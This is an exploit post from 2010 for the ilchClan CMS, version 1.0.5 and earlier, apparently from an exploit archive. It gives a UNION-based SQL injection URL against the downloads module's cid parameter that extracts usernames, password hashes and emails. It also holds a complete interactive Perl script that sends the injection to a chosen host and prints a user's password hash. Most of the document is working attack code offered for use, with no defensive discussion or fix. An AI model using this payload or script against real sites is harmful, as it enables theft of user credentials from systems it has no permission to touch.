----------------------------Information------------------------------------------------
+Name : ilchClan <= 1.0.5 SQL Injection Vulnerability & Exploit
+Autor : Easy Laster
+Date   : 05.04.2010
+Script  : ilchClan <= 1.0.5
+Price : for free
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne.

---------------------------------------------------------------------------------------
                                                                                     
 ___ ___ ___ ___                         _ _           _____           _         _   
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_ 
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|  
                                              |___|                 |___|            


----------------------------------------------------------------------------------------
+Vulnerability : http://www.site.com/ilchClan105/?m=downloads&cid=

+Exploitable   : http://www.site.com/ilchClan105/?m=downloads&cid=1+and+1=0+union+select
+1,concat(name,0x3a,pass,0x3a,email)+from+ilchclan_user+where+id=1--


-----------------------------------------------------------------------------------------

#Exploit


#!usr\bin\perl
#
#
##################################################
# Modules                                        #
#------------------------------------------------#     
use strict;               # Better coding.       #
use warnings;             # Useful warnings.     #
use LWP::Simple;          # procedureal interface#
##################################################
print "
##################################################
#            4004-Security-Project               #
##################################################
#         ilchClan <= 1.0.5 SQL Injection        #
#                     Exploit                    #
#          Using Host+Path+Userid+prefix         #
#          demo.de /ilchclan/ 1 ilchClan         #
#                   Easy Laster                  #
##################################################
\a\n";
my($host,$path,$userid,$request);
my($first,$block,$error,$dir,$prefix);
$block = "
##################################################\n";
$error = "Exploit failed";
  print "$block";
    print q(Target demo.de->);
    chomp($host =<STDIN>);
    if ($host eq""){
    die "$error\a\n"};
    print "$block";
          print q(Path /path/ ->);
          chomp($path =<STDIN>);
          if ($path eq""){
          die "$error\a\n";}
                 print "$block";
                 print q(userid->);
                  chomp($userid =<STDIN>);
                      if ($userid eq""){
                      die "$error\a\n";}
                      print "$block";
                            print q(prefix ilchClan ->);
                            chomp($prefix =<STDIN>);
                            if ($prefix eq""){
                            die "$error\a\n";}
                            print "$block";
                            $dir = "?m=downloads&cid=";
                            print "<~> Exploiting...\n";
                          $host = "http://".$host.$path.$dir;
                          print "<~> Connecting...\n";
                          $request = get($host."1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,pass)+from+".$prefix."_user+where+id=".$userid."--");
                       $first = rindex($request,"#####");
                       if ($first != -1)
                       {
               print "<~> Exploiting...\n";
               print "$block\n";
         $request = substr($request, $first+5, 32);
         print "<~> Hash = $request\n\r\n\a";
       }
       else
     {
   print "<~> $error";
}